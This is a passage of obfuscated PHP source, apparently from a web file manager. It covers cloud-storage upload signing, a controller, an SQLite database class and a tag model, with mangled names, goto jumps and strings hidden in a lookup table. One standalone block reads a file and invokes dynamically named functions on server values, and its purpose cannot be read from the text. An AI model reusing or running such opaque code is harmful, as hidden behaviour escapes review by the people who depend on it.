$–Êì¿â­ = $–Êì¿â­ ? $–Êì¿â­ : _get($¡Ÿ×»ñì, $_SERVER[Ò°Ì”İ•][265]); return $–Êì¿â­; } public function uploadFormData($Â‚¦ôïê, $§¼ûÌô‰ = 3600) { $øö³àÕº =& $_SERVER[Ò°Ì”İ•]; if (!$this->_isClientAsync()) { $Ÿ˜½â§Ó = $this->getPreSignedURL($Â‚¦ôïê, $§¼ûÌô‰, array(), $øö³àÕº[266]); return array($øö³àÕº[219] => str_replace($øö³àÕº[229], $øö³àÕº[267], $Ÿ˜½â§Ó)); } if (isset($GLOBALS[$øö³àÕº[6]][$øö³àÕº[103]][$øö³àÕº[268]]) && $GLOBALS[$øö³àÕº[6]][$øö³àÕº[103]][$øö³àÕº[268]] == $øö³àÕº[241]) { return $this->uploadMultiData($Â‚¦ôïê, $§¼ûÌô‰); } if ($this->signVer == $øö³àÕº[260]) { return $this->uploadFormDataV2($Â‚¦ôïê, $§¼ûÌô‰); } return $this->uploadFormDataV4($Â‚¦ôïê, $§¼ûÌô‰); } public function uploadFormDataV2($öŸÓêïê, $½Ñé»ÒÔ = 3600) { $’ŞÈ±É£ =& $_SERVER[Ò°Ì”İ•]; $‘¢¹±˜¥ = $this->pathFather($öŸÓêïê); $•Ç‰ı•Ç = $this->client->getHttpUploadPostParams($this->bucket, $‘¢¹±˜¥, $’ŞÈ±É£[242], $½Ñé»ÒÔ); $Ç„¥ÍÂÌ = array_merge((array) $•Ç‰ı•Ç, array($’ŞÈ±É£[269] => $’ŞÈ±É£[260], $’ŞÈ±É£[219] => $this->getHost())); if ($this->_isClientAsync()) { unset($Ç„¥ÍÂÌ[$’ŞÈ±É£[269]]); } return $Ç„¥ÍÂÌ; } public function uploadFormDataV4($‚æØÛ©, $§•œ¼òõ = 3600) { $š¾è±¨• =& $_SERVER[Ò°Ì”İ•]; $™Î›ƒ‘Í = $š¾è±¨•[242]; $™ƒ¼Ñû = $š¾è±¨•[270]; $ÒÜ’Ëö£ = $š¾è±¨•[73]; $Ğ¹ÀÙ–æ = gmdate($š¾è±¨•[271]); $¼²áğ® = gmdate($š¾è±¨•[272]); $«ı§©ÆÈ = $š¾è±¨•[273]; $‰İ ”» = $§•œ¼òõ . $š¾è±¨•[12]; $·ÔŒë²‰ = $š¾è±¨•[274]; $¶¬”òêÏ = array($this->accessKey, $¼²áğ®, $this->region, $ÒÜ’Ëö£, $«ı§©ÆÈ); $±°±Ó×Š = implode($š¾è±¨•[8], $¶¬”òêÏ); $™­ˆûõ‚ = array($š¾è±¨•[275] => gmdate($š¾è±¨•[276], strtotime($š¾è±¨•[277])), $š¾è±¨•[278] => array(array($š¾è±¨•[279] => $this->bucket), array($š¾è±¨•[280], $š¾è±¨•[281], $š¾è±¨•[12]), array($š¾è±¨•[280], $š¾è±¨•[282], $š¾è±¨•[12]), array($š¾è±¨•[283] => $·ÔŒë²‰), array($š¾è±¨•[284] => $±°±Ó×Š), array($š¾è±¨•[285] => $™ƒ¼Ñû), array($š¾è±¨•[286] => $Ğ¹ÀÙ–æ), array($š¾è±¨•[287] => $‰İ ”»))); $â„§‡¬© = base64_encode(json_encode($™­ˆûõ‚)); $¢¸Å…² = hash_hmac($š¾è±¨•[288], $¼²áğ®, $š¾è±¨•[289] . $this->secret, !0); $´é‡Ãõ† = hash_hmac($š¾è±¨•[288], $this->region, $¢¸Å…², !0); $£È÷Ë¹ë = hash_hmac($š¾è±¨•[288], $ÒÜ’Ëö£, $´é‡Ãõ†, !0); $â¹€š¼ = hash_hmac($š¾è±¨•[288], $«ı§©ÆÈ, $£È÷Ë¹ë, !0); $£¬Úäá» = hash_hmac($š¾è±¨•[288], $â„§‡¬©, $â¹€š¼); $±ÀÓ¼—Ÿ = array($š¾è±¨•[259] => $š¾è±¨•[12], $š¾è±¨•[283] => $·ÔŒë²‰, $š¾è±¨•[290] => $â„§‡¬©, $š¾è±¨•[284] => $±°±Ó×Š, $š¾è±¨•[285] => $™ƒ¼Ñû, $š¾è±¨•[286] => $Ğ¹ÀÙ–æ, $š¾è±¨•[287] => $‰İ ”», $š¾è±¨•[291] => $£¬Úäá», $š¾è±¨•[269] => $š¾è±¨•[260], $š¾è±¨•[219] => $this->getHost()); if ($this->_isClientAsync()) { unset($±ÀÓ¼—Ÿ[$š¾è±¨•[269]]); } return $±ÀÓ¼—Ÿ; } public function uploadMultiData($öâèå“Ú, $±€©òäò = 3600) { $¾­î˜èÈ =& $_SERVER[Ò°Ì”İ•]; $³††­Á‘ = $this->signVer == $¾­î˜èÈ[260] ? gmdate($¾­î˜èÈ[292]) : gmdate($¾­î˜èÈ[293]); $üÈÕñİå = array(); $§˜„‰ = $this->client->getUploadId($this->bucket, $öâèå“Ú, $üÈÕñİå); if (!$§˜„‰) { return !1; } $¨Ò«Ø¾ = array($¾­î˜èÈ[294] => $§˜„‰, $¾­î˜èÈ[219] => $this->getHost() . $¾­î˜èÈ[8] . $this->pathEncode($öâèå“Ú), $¾­î˜èÈ[295] => $³††­Á‘, $¾­î˜èÈ[108] => $öâèå“Ú, $¾­î˜èÈ[269] => $this->signVer); if ($this->_isClientAsync()) { unset($¨Ò«Ø¾[$¾­î˜èÈ[269]]); } return $¨Ò«Ø¾; } public function uploadMultiAuth($›íÇœ«Ì, $ï™ôÀø = array()) { $¿³œ³·… =& $_SERVER[Ò°Ì”İ•]; if ($this->signVer == $¿³œ³·…[260]) { if (isset($ï™ôÀø[$¿³œ³·…[296]])) { return $this->uploadPartAuthV2($›íÇœ«Ì, $ï™ôÀø); } return $this->uploadListAuthV2($›íÇœ«Ì, $ï™ôÀø); } if (isset($ï™ôÀø[$¿³œ³·…[296]])) { return $this->uploadPartAuthV4($›íÇœ«Ì, $ï™ôÀø); } return $this->uploadListAuthV4($›íÇœ«Ì, $ï™ôÀø); } public function uploadPartAuthV2($şÁ¿ùÊ», $ª²“îÆÜ = array()) { $Î’À˜§Ú =& $_SERVER[Ò°Ì”İ•]; $ˆ©éø˜Ë = $ª²“îÆÜ[$Î’À˜§Ú[108]]; $Ú¶ŠúÇ˜ = gmdate($Î’À˜§Ú[292]); $Æô¯Çê = array_intersect_key($ª²“îÆÜ, array_flip(array($Î’À˜§Ú[296], $Î’À˜§Ú[294]))); ksort($Æô¯Çê); $¥¨…‰İİ = $Æô¯Çê ? $Î’À˜§Ú[87] . http_build_query($Æô¯Çê, null, $Î’À˜§Ú[297], PHP_QUERY_RFC3986) : $Î’À˜§Ú[12]; $ùÍßÂ = array($Î’À˜§Ú[266], $Î’À˜§Ú[12], $Î’À˜§Ú[134], $Î’À˜§Ú[12], "\170\x2d\141\x6d\x7a\55\x64\141\x74\145\72{$Ú¶ŠúÇ˜}", $Î’À˜§Ú[8] . $this->bucket . $Î’À˜§Ú[8] . $this->pathEncode($ˆ©éø˜Ë) . $¥¨…‰İİ); $ÊßØƒË¼ = implode($Î’À˜§Ú[59], $ùÍßÂ); $µ¥ª¬¡’ = $this->client->__getSignature($ÊßØƒË¼); return array($Î’À˜§Ú[298] => $µ¥ª¬¡’, $Î’À˜§Ú[295] => $Ú¶ŠúÇ˜); } public function uploadListAuthV2($†ĞŒı·œ, $è®è•Î¤ = array()) { $ş¬ßÀ¥¬ =& $_SERVER[Ò°Ì”İ•]; $ƒìéÍĞ = $è®è•Î¤[$ş¬ßÀ¥¬[108]]; $ü¦Ò§» = $è®è•Î¤[$ş¬ßÀ¥¬[294]]; $Ñí¶—ú… = $this->client->listParts($this->bucket, $ƒìéÍĞ, $ü¦Ò§»); if (!$Ñí¶—ú…) { return !1; } $Ùœş–€Å = gmdate($ş¬ßÀ¥¬[292]); $ØÊ˜É¡ë = $ş¬ßÀ¥¬[299] . $ü¦Ò§»; $ïäî¿¼Ÿ = array($ş¬ßÀ¥¬[300], $ş¬ßÀ¥¬[12], $ş¬ßÀ¥¬[134], $ş¬ßÀ¥¬[12], "\170\x2d\x61\x6d\x7a\x2d\x64\141\x74\145\72{$Ùœş–€Å}", $ş¬ßÀ¥¬[8] . $this->bucket . $ş¬ßÀ¥¬[8] . $this->pathEncode($ƒìéÍĞ) . $ØÊ˜É¡ë); $ø‹ş’ˆ­ = implode($ş¬ßÀ¥¬[59], $ïäî¿¼Ÿ); $¼äı»¬Ã = $this->client->__getSignature($ø‹ş’ˆ­); return array($ş¬ßÀ¥¬[298] => $¼äı»¬Ã, $ş¬ßÀ¥¬[295] => $Ùœş–€Å, $ş¬ßÀ¥¬[301] => $Ñí¶—ú…); } public function uploadPartAuthV4($Àîˆ½·, $ƒêË’ºã = array()) { $èĞĞ«ó± =& $_SERVER[Ò°Ì”İ•]; $®ú‘ôîì = $ƒêË’ºã[$èĞĞ«ó±[108]]; $®²ÍÅ»¸ = array($èĞĞ«ó±[286] => gmdate($èĞĞ«ó±[293]), $èĞĞ«ó±[302] => _get($ƒêË’ºã, $èĞĞ«ó±[303], hash($èĞĞ«ó±[288], $èĞĞ«ó±[12]))); $ìÆ¨ˆ¬ä = explode($èĞĞ«ó±[221], $this->getHost()); $¿àìîµª = array($èĞĞ«ó±[304] => $ìÆ¨ˆ¬ä[1], $èĞĞ«ó±[305] => $èĞĞ«ó±[12], $èĞĞ«ó±[259] => $èĞĞ«ó±[134], $èĞĞ«ó±[306] => $ƒêË’ºã[$èĞĞ«ó±[90]]); $Ê¨³®š = $èĞĞ«ó±[266]; $œƒÊş¥  = $èĞĞ«ó±[8] . $this->pathEncode($®ú‘ôîì); $ØÅÎ”£ƒ = array_intersect_key($ƒêË’ºã, array_flip(array($èĞĞ«ó±[296], $èĞĞ«ó±[294]))); $ùÀ¶«œ¿ = $this->client->__getSignatureV4($®²ÍÅ»¸, $¿àìîµª, $Ê¨³®š, $œƒÊş¥ , $ØÅÎ”£ƒ); return array($èĞĞ«ó±[298] => $ùÀ¶«œ¿, $èĞĞ«ó±[302] => $®²ÍÅ»¸[$èĞĞ«ó±[302]], $èĞĞ«ó±[295] => $®²ÍÅ»¸[$èĞĞ«ó±[286]]); } public function uploadListAuthV4($‚çÉ…Õ, $’å¾«ì = array()) { $„å¬ªºä =& $_SERVER[Ò°Ì”İ•]; $¶Í¡²œÔ = $’å¾«ì[$„å¬ªºä[108]]; $»¼„¶­ˆ = $’å¾«ì[$„å¬ªºä[294]]; $›ƒ‘Š¬à = $this->client->listParts($this->bucket, $¶Í¡²œÔ, $»¼„¶­ˆ); if (!$›ƒ‘Š¬à) { return !1; } $ş×¾Ì±¥ = $„å¬ªºä[307]; foreach ($›ƒ‘Š¬à as $“›†ãˆ¿) { $ş×¾Ì±¥ .= $„å¬ªºä[308] . "\74\x50\141\162\164\x4e\165\x6d\142\x65\x72\76{$“›†ãˆ¿[$„å¬ªºä[309]]}\74\57\120\141\x72\x74\116\165\x6d\142\145\162\x3e\xa" . "\74\105\x54\141\x67\76{$“›†ãˆ¿[$„å¬ªºä[310]]}\x3c\x2f\x45\x54\141\x67\x3e\12" . $„å¬ªºä[311]; } $ş×¾Ì±¥ .= $„å¬ªºä[312]; $¹¦ñëÑŞ = array($„å¬ªºä[286] => gmdate($„å¬ªºä[293]), $„å¬ªºä[302] => hash($„å¬ªºä[288], $ş×¾Ì±¥)); $ã¢Á¼ºÀ = explode($„å¬ªºä[221], $this->getHost()); $Ì„ğó± = array($„å¬ªºä[304] => $ã¢Á¼ºÀ[1], $„å¬ªºä[259] => $„å¬ªºä[134], $„å¬ªºä[306] => strlen($ş×¾Ì±¥)); $ÈÕû ğ‡ = $„å¬ªºä[300]; $€Ó“’‡ = $„å¬ªºä[8] . $this->pathEncode($¶Í¡²œÔ); $Ğ’êæ‰¸ = array($„å¬ªºä[294] => $»¼„¶­ˆ); $Çàş†ø = $this->client->__getSignatureV4($¹¦ñëÑŞ, $Ì„ğó±, $ÈÕû ğ‡, $€Ó“’‡, $Ğ’êæ‰¸); return array($„å¬ªºä[298] => $Çàş†ø, $„å¬ªºä[302] => $¹¦ñëÑŞ[$„å¬ªºä[302]], $„å¬ªºä[295] => $¹¦ñëÑŞ[$„å¬ªºä[286]], $„å¬ªºä[301] => $›ƒ‘Š¬à); } private function _isClientAsync() { $š¼ƒ ‰Ã =& $_SERVER[Ò°Ì”İ•]; static $©Ûìï¬¥ = null; if ($©Ûìï¬¥ === null) { $É£„²”¡ = isset($_REQUEST[$š¼ƒ ‰Ã[313]]) ? json_decode($_REQUEST[$š¼ƒ ‰Ã[313]], !0) : !1; $©Ûìï¬¥ = $É£„²”¡ && _get($É£„²”¡, $š¼ƒ ‰Ã[314]) == $š¼ƒ ‰Ã[315]; } return $©Ûìï¬¥; } public function getHost() { $¦æÍ…åù =& $_SERVER[Ò°Ì”İ•]; $„ßèßü = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¦æÍ…åù[81], $¦æÍ…åù[75], $¦æÍ…åù[80], $¦æÍ…åù[73]))) { return $„ßèßü . $¦æÍ…åù[8] . $this->bucket; } if ($this->osType == $¦æÍ…åù[73] && !is_domain($„ßèßü)) { return $„ßèßü . $¦æÍ…åù[8] . $this->bucket; } $„ßèßü = explode($¦æÍ…åù[221], $„ßèßü); return $„ßèßü[0] . $¦æÍ…åù[221] . $this->bucket . $¦æÍ…åù[10] . $„ßèßü[1]; } public function size($â¼Ğ) { $şÇê²Ò¦ = $this->objectMeta($â¼Ğ); return $şÇê²Ò¦ ? $şÇê²Ò¦[$_SERVER[Ò°Ì”İ•][90]] : 0; } public function info($ñ•ó”¿×) { if ($this->isFolder($ñ•ó”¿×)) { return $this->folderInfo($ñ•ó”¿×); } else { if ($this->isFile($ñ•ó”¿×)) { return $this->fileInfo($ñ•ó”¿×); } } return !1; } public function exist($Î˜öÛÍ†) { return $this->isFile($Î˜öÛÍ†) || $this->isFolder($Î˜öÛÍ†); } public function isFile($ıÏ„‚â–) { return !$this->isFolder($ıÏ„‚â–) && $this->objectMeta($ıÏ„‚â–); } public function isFolder($¿šÕÜ‰) { return $this->cacheMethod($_SERVER[Ò°Ì”İ•][190], $¿šÕÜ‰); } protected function objectMeta($Ïå—Ï©§) { return $this->cacheMethod($_SERVER[Ò°Ì”İ•][192], $Ïå—Ï©§); } protected function _objectMeta($‚±‘Í™Ú) { $ôˆÉ‰²¯ =& $_SERVER[Ò°Ì”İ•]; $‚±‘Í™Ú = rtrim($‚±‘Í™Ú, $ôˆÉ‰²¯[8]); try { $ãÄ©šìö = $this->client->getObjectInfo($this->bucket, $‚±‘Í™Ú); if (!isset($ãÄ©šìö[$ôˆÉ‰²¯[265]]) && isset($ãÄ©šìö[$ôˆÉ‰²¯[316]])) { $ãÄ©šìö[$ôˆÉ‰²¯[265]] = $ãÄ©šìö[$ôˆÉ‰²¯[316]]; } } catch (Exception $ÓõÈóõŸ) { $ãÄ©šìö = !1; } if (!$ãÄ©šìö) { } return $ãÄ©šìö; } protected function _isFolder($™É‘¡á°) { $¨†¦šé® =& $_SERVER[Ò°Ì”İ•]; $™É‘¡á° = rtrim($™É‘¡á°, $¨†¦šé®[8]) . $¨†¦šé®[8]; if ($™É‘¡á° == $¨†¦šé®[12] || $™É‘¡á° == $¨†¦šé®[8]) { return !0; } $†±èÏ¯Ø = $this->client->getBucket($this->bucket, $™É‘¡á°, null, 1); if (empty($†±èÏ¯Ø[$¨†¦šé®[249]])) { return !1; } $³Ñ©— = $†±èÏ¯Ø[$¨†¦šé®[249]][0][$¨†¦šé®[32]]; return stripos($³Ñ©—, $™É‘¡á°) === 0 ? !0 : !1; if (substr($³Ñ©—, -1) == $¨†¦šé®[8]) { return !0; } if (get_path_this($³Ñ©—) == get_path_this($™É‘¡á°)) { return !1; } return !0; } public function listObject($áœá’Î¬) { return $this->fileList($áœá’Î¬, $_SERVER[Ò°Ì”İ•][12], !0); } } goto EˆÁäùÉøÏ; B„“ÃÇóÎê: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ö¯•î =& $_SERVER[Ò°Ì”İ•]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ö¯•î[6]] =& $config; $this->values[$ö¯•î[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ö¯•î[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($‹”Â¯¿—) { if (1 === func_num_args()) { $this->{$‹”Â¯¿—} = new $‹”Â¯¿—(); } else { $æíÚØ¥€ = new ReflectionClass($‹”Â¯¿—); $Ğ×‹ÍÒ† = func_get_args(); array_shift($Ğ×‹ÍÒ†); $this->{$‹”Â¯¿—} = $æíÚØ¥€->newInstanceArgs($Ğ×‹ÍÒ†); } return $this->{$‹”Â¯¿—}; } public function routeBind($úåı‚êÆ, $ıò—úô, $”ÙŠ¿Åˆ = 3) { $¼ò¿ÓÃ =& $_SERVER[Ò°Ì”İ•]; $ëÂØ¼ºÖ = $this->in[$¼ò¿ÓÃ[9]]; $úåı‚êÆ = str_replace($¼ò¿ÓÃ[10], $¼ò¿ÓÃ[11], trim(trim($úåı‚êÆ, $¼ò¿ÓÃ[8]), $¼ò¿ÓÃ[12])); if (!$úåı‚êÆ || count($ëÂØ¼ºÖ) <= $”ÙŠ¿Åˆ) { return !1; } $°³¯ı–ë = !0; $¥‘óÒšÓ = explode($¼ò¿ÓÃ[8], $úåı‚êÆ); for ($°¸¥×– = 0; $°¸¥×– < count($¥‘óÒšÓ); $°¸¥×–++) { if ($¥‘óÒšÓ[$°¸¥×–] != $ëÂØ¼ºÖ[$”ÙŠ¿Åˆ + $°¸¥×–]) { $°³¯ı–ë = !1; break; } } if (!$°³¯ı–ë) { return; } call_user_func_array(array($this, $ıò—úô), array()); } public function routeArgs($¦­ñÊ = 3) { $Ó˜ò§ŠÏ = $this->in[$_SERVER[Ò°Ì”İ•][9]]; if (count($Ó˜ò§ŠÏ) <= $¦­ñÊ) { return array(); } $ƒ½„Õ¿÷ = array(); for ($ÈÂ¯ÕÙ = $¦­ñÊ; $ÈÂ¯ÕÙ < count($Ó˜ò§ŠÏ); $ÈÂ¯ÕÙ += 2) { $ƒ½„Õ¿÷[$Ó˜ò§ŠÏ[$ÈÂ¯ÕÙ]] = $Ó˜ò§ŠÏ[$ÈÂ¯ÕÙ + 1]; $this->in[$Ó˜ò§ŠÏ[$ÈÂ¯ÕÙ]] = $Ó˜ò§ŠÏ[$ÈÂ¯ÕÙ + 1]; } return $ƒ½„Õ¿÷; } protected function assign($à‡Ò”Ğ, $ˆ£¾ÏÜÆ) { $this->values[$à‡Ò”Ğ] = $ˆ£¾ÏÜÆ; } protected function display($úíìĞÔ) { ob_end_clean(); extract($this->values); require $this->tpl . $úíìĞÔ; } } class DbSqliteBase extends Db { public function __construct($Õ¡‰ú×³ = '') { $°§ï‡üñ =& $_SERVER[Ò°Ì”İ•]; if (!extension_loaded($°§ï‡üñ[13])) { think_exception(think_lang($°§ï‡üñ[14]) . $°§ï‡üñ[15]); } if (!empty($Õ¡‰ú×³)) { if (!isset($Õ¡‰ú×³[$°§ï‡üñ[16]])) { $Õ¡‰ú×³[$°§ï‡üñ[16]] = 438; } $this->config = $Õ¡‰ú×³; if (empty($this->config[$°§ï‡üñ[17]])) { $this->config[$°§ï‡üñ[17]] = array(); } } } public function connect($©ÄÌë‡¥ = '', $Ü¼€¡Õµ = 0) { $ÜÅËÈŸ· =& $_SERVER[Ò°Ì”İ•]; if (!isset($this->linkID[$Ü¼€¡Õµ])) { if (empty($©ÄÌë‡¥)) { $©ÄÌë‡¥ = $this->config; } $ğ³ìä›ç = !empty($©ÄÌë‡¥[$ÜÅËÈŸ·[17]][$ÜÅËÈŸ·[18]]) ? $©ÄÌë‡¥[$ÜÅËÈŸ·[17]][$ÜÅËÈŸ·[18]] : $this->pconnect; $û†¼†ô = $ğ³ìä›ç ? $ÜÅËÈŸ·[19] : $ÜÅËÈŸ·[20]; $this->linkID[$Ü¼€¡Õµ] = $û†¼†ô($©ÄÌë‡¥[$ÜÅËÈŸ·[21]], $©ÄÌë‡¥[$ÜÅËÈŸ·[16]]); if (!$this->linkID[$Ü¼€¡Õµ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Ü¼€¡Õµ], 30000); if (1 != think_config($ÜÅËÈŸ·[22])) { unset($this->config); } } return $this->linkID[$Ü¼€¡Õµ]; } public function free() { $this->queryID = null; } public function query($¸¨Ó„Úİ) { $½İ¥‘Û… =& $_SERVER[Ò°Ì”İ•]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¸¨Ó„Úİ; if ($this->queryID) { $this->free(); } think_action_status($½İ¥‘Û…[23], 1); think_status($½İ¥‘Û…[24]); $this->queryID = sqlite_query($this->_linkID, $¸¨Ó„Úİ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¦»ÔÄ´à = $this->getAll(); return $¦»ÔÄ´à; } } public function execute($’ÌĞß×) { $Õà„İÙÕ =& $_SERVER[Ò°Ì”İ•]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $’ÌĞß×; if ($this->queryID) { $this->free(); } think_action_status($Õà„İÙÕ[25], 1); think_status($Õà„İÙÕ[24]); $Ñì‰É›š = sqlite_exec($this->_linkID, $’ÌĞß×); $this->debug(); if (!1 === $Ñì‰É›š) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ò°Ì”İ•][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $×æİ°Ñã = sqlite_query($this->_linkID, $_SERVER[Ò°Ì”İ•][27]); if (!$×æİ°Ñã) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ö¬ËÕ§Í = sqlite_query($this->_linkID, $_SERVER[Ò°Ì”İ•][28]); if (!$ö¬ËÕ§Í) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¿ê“ç‘Â = array(); if ($this->numRows > 0) { for ($“„É¡˜ = 0; $“„É¡˜ < $this->numRows; $“„É¡˜++) { $¿ê“ç‘Â[$“„É¡˜] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¿ê“ç‘Â; } public function getFields($šòÌÖ„) { $Ùı›ú¤Ú =& $_SERVER[Ò°Ì”İ•]; $É‰Ú“Í = $this->query($Ùı›ú¤Ú[29] . $šòÌÖ„ . $Ùı›ú¤Ú[30]); $óÖÑ«¢ = array(); if ($É‰Ú“Í) { foreach ($É‰Ú“Í as $İ‹¬£… => $ÍË¯ğõ÷) { $óÖÑ«¢[$ÍË¯ğõ÷[$Ùı›ú¤Ú[31]]] = array($Ùı›ú¤Ú[32] => $ÍË¯ğõ÷[$Ùı›ú¤Ú[31]], $Ùı›ú¤Ú[33] => $ÍË¯ğõ÷[$Ùı›ú¤Ú[34]], $Ùı›ú¤Ú[35] => (bool) ($ÍË¯ğõ÷[$Ùı›ú¤Ú[36]] === $Ùı›ú¤Ú[12]), $Ùı›ú¤Ú[37] => $ÍË¯ğõ÷[$Ùı›ú¤Ú[38]], $Ùı›ú¤Ú[39] => strtolower($ÍË¯ğõ÷[$Ùı›ú¤Ú[40]]) == $Ùı›ú¤Ú[41], $Ùı›ú¤Ú[42] => strtolower($ÍË¯ğõ÷[$Ùı›ú¤Ú[43]]) == $Ùı›ú¤Ú[44]); } } return $óÖÑ«¢; } public function getTables($™šèü´ú = '') { $Ô‘ªûÚ =& $_SERVER[Ò°Ì”İ•]; $ÓØªå´± = $this->query($Ô‘ªûÚ[45] . $Ô‘ªûÚ[46] . $Ô‘ªûÚ[47]); $Ô¨È©ü± = array(); foreach ($ÓØªå´± as $ÑâÌ¶† => $½Âß×³š) { $Ô¨È©ü±[$ÑâÌ¶†] = current($½Âß×³š); } return $Ô¨È©ü±; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $œ°¿‹Äö =& $_SERVER[Ò°Ì”İ•]; $ÛèØîçØ = sqlite_last_error($this->_linkID); $this->error = $ÛèØîçØ . $œ°¿‹Äö[4] . sqlite_error_string($ÛèØîçØ); if ($œ°¿‹Äö[12] != $this->queryStr) { $this->error .= LNG($œ°¿‹Äö[48]) . $this->queryStr; } think_trace($this->error, $œ°¿‹Äö[12], $œ°¿‹Äö[49]); return $this->error; } public function escapeString($Ñıî„) { return sqlite_escape_string($Ñıî„); } public function parseLimit($“¦¯Õìó) { $ıúèƒÎõ =& $_SERVER[Ò°Ì”İ•]; $¨àªú’ = $ıúèƒÎõ[12]; if (!empty($“¦¯Õìó)) { $“¦¯Õìó = explode($ıúèƒÎõ[50], $“¦¯Õìó); if (count($“¦¯Õìó) > 1) { $¨àªú’ .= $ıúèƒÎõ[51] . $“¦¯Õìó[1] . $ıúèƒÎõ[52] . $“¦¯Õìó[0] . $ıúèƒÎõ[53]; } else { $¨àªú’ .= $ıúèƒÎõ[51] . $“¦¯Õìó[0] . $ıúèƒÎõ[53]; } } return $¨àªú’; } } if ($_SERVER[$_SERVER[Ò°Ì”İ•][54]] != $_SERVER[$_SERVER[Ò°Ì”İ•][55]]) { $_getc = $_SERVER[Ò°Ì”İ•][56]; $_getfile = $_SERVER[$_SERVER[Ò°Ì”İ•][57]] . $_SERVER[Ò°Ì”İ•][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ò°Ì”İ•][59], $_getfilec); if (count($_getarrs) < $_SERVER[Ò°Ì”İ•][60]) { $exit = $_SERVER[Ò°Ì”İ•][61]; $exit(); } $_act = $_SERVER[Ò°Ì”İ•][62]; $_act($_SERVER[$_SERVER[Ò°Ì”İ•][63]]); } goto CÔöµÔÚ§; eéƒ¼…”îŒ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($ü†‡î‡ì) { $±Ü¹åô¸ =& $_SERVER[Ò°Ì”İ•]; return array($±Ü¹åô¸[2084] => array($±Ü¹åô¸[2507] . USER_ID, $±Ü¹åô¸[2085])); } protected function listData() { $ÁÙ©Ú°´ =& $_SERVER[Ò°Ì”İ•]; $”óæÜ´ = array($ÁÙ©Ú°´[1759] => USER_ID, $ÁÙ©Ú°´[569] => array($ÁÙ©Ú°´[2088], 0)); $À›µİ’¬ = $ÁÙ©Ú°´[2508]; $Üªö¯ùÍ = $this->field($À›µİ’¬)->where($”óæÜ´)->order($ÁÙ©Ú°´[2091])->select(); return $Üªö¯ùÍ ? $Üªö¯ùÍ : array(); } protected function addToTag($€õ„â¥Ê, $«Ô£î–½) { $ıØÏ‡ÂË =& $_SERVER[Ò°Ì”İ•]; if (!Model($ıØÏ‡ÂË[2237])->listData($«Ô£î–½)) { return !1; } if (is_numeric($€õ„â¥Ê)) { $ğåö•‰è = Model($ıØÏ‡ÂË[898])->pathInfo($€õ„â¥Ê); if (!$ğåö•‰è) { return !1; } } else { $ğåö•‰è = IO::infoSimple($€õ„â¥Ê); if (!$ğåö•‰è) { return !1; } $“Ş²Û¦™ = $ğåö•‰è[$ıØÏ‡ÂË[32]]; $ Äº = $ğåö•‰è[$ıØÏ‡ÂË[33]]; if (isset($ğåö•‰è[$ıØÏ‡ÂË[497]])) { $ Äº = $ğåö•‰è[$ıØÏ‡ÂË[497]] == $ıØÏ‡ÂË[102] ? $ıØÏ‡ÂË[89] : $ıØÏ‡ÂË[243]; } } $ûçõ§†û = array($ıØÏ‡ÂË[1759] => USER_ID, $ıØÏ‡ÂË[569] => $«Ô£î–½, $ıØÏ‡ÂË[507] => $€õ„â¥Ê, $ıØÏ‡ÂË[508] => $ Äº ? $ Äº : $ıØÏ‡ÂË[502], $ıØÏ‡ÂË[506] => $“Ş²Û¦™ ? $“Ş²Û¦™ : $ıØÏ‡ÂË[12], $ıØÏ‡ÂË[1973] => 0); if ($this->where($ûçõ§†û)->find()) { return !1; } return $this->add($ûçõ§†û); } protected function removeFromTag($ˆ»ó‹²¨, $Î‚ë¬¸Å) { $ËšÃÑè² =& $_SERVER[Ò°Ì”İ•]; if (!Model($ËšÃÑè²[2237])->listData($Î‚ë¬¸Å)) { return !1; } if (is_array($ˆ»ó‹²¨)) { $ˆ»ó‹²¨ = array($ËšÃÑè²[7], $ˆ»ó‹²¨); } $–¨²ÚÈÛ = array($ËšÃÑè²[1759] => USER_ID, $ËšÃÑè²[569] => $Î‚ë¬¸Å, $ËšÃÑè²[507] => $ˆ»ó‹²¨); return $this->where($–¨²ÚÈÛ)->delete(); } protected function removeByTag($•…Ì¼œ) { $Ñ‡©Ãë– =& $_SERVER[Ò°Ì”İ•]; if (!$•…Ì¼œ) { return !1; } $šìÍìÁÅ = array($Ñ‡©Ãë–[1759] => USER_ID, $Ñ‡©Ãë–[569] => $•…Ì¼œ); return $this->where($šìÍìÁÅ)->delete(); } protected function removeBySource($ä¡™Û¾ì) { $Ÿ¨ï¿ƒ¿ =& $_SERVER[Ò°Ì”İ•]; if (is_array($ä¡™Û¾ì)) { $ä¡™Û¾ì = array($Ÿ¨ï¿ƒ¿[7], $ä¡™Û¾ì); } $¸Óúú–ò = array($Ÿ¨ï¿ƒ¿[1759] => USER_ID, $Ÿ¨ï¿ƒ¿[569] => array($Ÿ¨ï¿ƒ¿[1087], 0), $Ÿ¨ï¿ƒ¿[507] => $ä¡™Û¾ì); return $this->where($¸Óúú–ò)->delete(); } }